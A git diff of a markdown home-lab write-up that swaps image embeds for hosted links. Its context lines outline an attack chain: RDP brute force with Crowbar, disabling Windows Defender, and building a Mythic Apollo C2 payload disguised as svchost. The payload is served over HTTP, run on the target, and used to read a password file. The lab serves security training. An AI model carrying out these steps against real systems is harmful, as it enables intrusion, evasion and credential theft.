@@ -19,7 +19,8 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
 
 1. **Create Fake Password File**
     - Navigate to `Documents` and create a file named `passwords.txt`.
-        ![[Pasted image 20251018160503.png]]
+        <img width="825" height="263" alt="image" src="https://github.com/user-attachments/assets/6eea9ee7-8e65-4ae4-bfee-acac31891189" />
+
 
 2. **Change Windows Password**
     
@@ -32,7 +33,8 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
     
     - Minimum password length: **5 characters**
     - Disable complexity requirements in _Local Group Policy Editor_.
-    ![[Pasted image 20251018160803.png]]
+    <img width="842" height="399" alt="image" src="https://github.com/user-attachments/assets/0573be57-d6dc-422e-9f62-707531e75461" />
+
 
 ---
 
@@ -45,7 +47,8 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
         `sudo gunzip rockyou.txt.gz 
         `sudo head -50 rockyou.txt > ~/home/kali/mydfir-wordlist.txt 
         `echo "Winter2024!" >> ~/home/kali/mydfir-wordlist.txt
-        ![[Screenshot (24).png]]
+        <img width="1129" height="778" alt="image" src="https://github.com/user-attachments/assets/1946cd67-7bc5-4a49-bd96-975b9cfc6384" />
+
         
 2. **Install Crowbar**
     
@@ -65,7 +68,8 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
     - Username: `Administrator`
     - Password: `Winter2024!`
         
-![[Pasted image 20251018163154.png]]
+<img width="799" height="277" alt="image" src="https://github.com/user-attachments/assets/4c6f45d0-63e0-4faf-9537-3ffca5551ed5" />
+
 
 ---
 
@@ -77,7 +81,8 @@ Goal: Perform an RDP brute force attack using Kali Linux, generate a Mythic C2 a
     
 2. **Trust the certificate** to complete the connection.
     
-![[Screenshot 2025-10-18 163516.png]]
+<img width="875" height="623" alt="image" src="https://github.com/user-attachments/assets/c488e7a3-e53a-4564-8dab-d9e61b4f922c" />
+
 ---
 
 ### 6. Discovery Phase
@@ -89,8 +94,10 @@ Run basic discovery commands in PowerShell or CMD:
 `net user 
 `net group 
 `net user Administrator`
-![[Pasted image 20251018164112.png]]
-![[Pasted image 20251018164424.png]]
+<img width="788" height="161" alt="image" src="https://github.com/user-attachments/assets/11ad2021-fc9c-4583-99f7-bbebeebeda4d" />
+
+<img width="406" height="324" alt="image" src="https://github.com/user-attachments/assets/f67e4574-a286-4852-bf8a-e4189cad78b8" />
+
 ---
 
 ### 7. Defense Evasion
@@ -99,7 +106,8 @@ Disable Windows Defender:
 
 - Open **Windows Security** → **Virus & Threat Protection**.
 - Disable Real-time protection and other security features.
-![[Pasted image 20251018164559.png]]
+<img width="782" height="670" alt="image" src="https://github.com/user-attachments/assets/203b2f37-5a6d-49f4-ba7c-98faa4057ab5" />
+
 ---
 
 ### 8. Execution Phase (Mythic Agent Setup)
@@ -112,13 +120,15 @@ Disable Windows Defender:
     
     `./mythic-cli install github https://github.com/MythicAgents/Apollo.git`
     
-    ![[Screenshot (25).png]]
+    <img width="489" height="135" alt="image" src="https://github.com/user-attachments/assets/559101b1-dd5b-4a9a-b06e-7d1a76430743" />
+
     
 3. **Install HTTP C2 Profile**
     
     `./mythic-cli install github https://github.com/MythicC2Profiles/http`
     
-    ![[Pasted image 20251018165718.png]]
+    <img width="684" height="277" alt="image" src="https://github.com/user-attachments/assets/e9ff0379-9edc-4658-8ad7-a464a150e306" />
+
     
 4. **Create Payload in Mythic Web GUI**
     
@@ -130,7 +140,8 @@ Disable Windows Defender:
     - Port: `80`
     - Payload Name: `apollo.exe`
 
-![[Pasted image 20251018170233.png]]
+<img width="1100" height="469" alt="image" src="https://github.com/user-attachments/assets/48498763-0a9f-41df-af08-c59c8bbfb80a" />
+
 
 ---
 
@@ -141,7 +152,8 @@ Disable Windows Defender:
     `wget <payload_download_link> --no-check-certificate
     `mv lcd5d49e-680e-4478-8526-708858e25b14 svchost-emaan.exe`
     
-    ![[Pasted image 20251018170657.png]]
+    <img width="498" height="49" alt="image" src="https://github.com/user-attachments/assets/921edabb-ce53-4c88-87f3-907a48cb23ed" />
+
     
 2. **Serve Payload over HTTP**
     
@@ -149,7 +161,9 @@ Disable Windows Defender:
     `ufw allow 9999`
     `python3 -m http.server 9999`
 
-![[Pasted image 20251018171055.png]]
+<img width="575" height="98" alt="image" src="https://github.com/user-attachments/assets/2c3b91be-f0a4-4417-a45a-376233cd8da5" />
+<img width="325" height="217" alt="image" src="https://github.com/user-attachments/assets/f8b3393e-2bd2-4f15-afe4-3c8a7d116400" />
+
 ![[Pasted image 20251018171120.png]]
 3. **Download on Windows Target**
     
@@ -157,7 +171,8 @@ Disable Windows Defender:
     
     - Navigate into "C:\Users\Public\Downloads" to check if the file has been downloaded.
     
-    ![[Pasted image 20251018172206.png]]
+    <img width="200" height="53" alt="image" src="https://github.com/user-attachments/assets/a7300b5a-a187-4e77-a277-5868b6e6aa66" />
+
 
     
 3. **Execute Payload**
@@ -180,9 +195,11 @@ Disable Windows Defender:
     `whoami 
     `ipconfig`
     
-    ![[Pasted image 20251018173109.png]]
+    <img width="1001" height="113" alt="image" src="https://github.com/user-attachments/assets/af3c2587-4544-4f9f-9de6-fcb722d0d5d9" />
 
-![[Screenshot 2025-10-18 173134.png]]
+
+<img width="616" height="174" alt="image" src="https://github.com/user-attachments/assets/8c1e1df4-705f-40cf-b4a2-59a4868665b5" />
+
 
 
 ---
@@ -198,7 +215,8 @@ Disable Windows Defender:
     - Navigate to **Files** → Check `passwords.txt` contents.
 
 
-![[Pasted image 20251018173804.png]]
+![Uploading image.png…]()
+
 
 **Reference**
 https://youtu.be/85x0NLj2zUo?si=_cpuOgH-OqAYwgYo
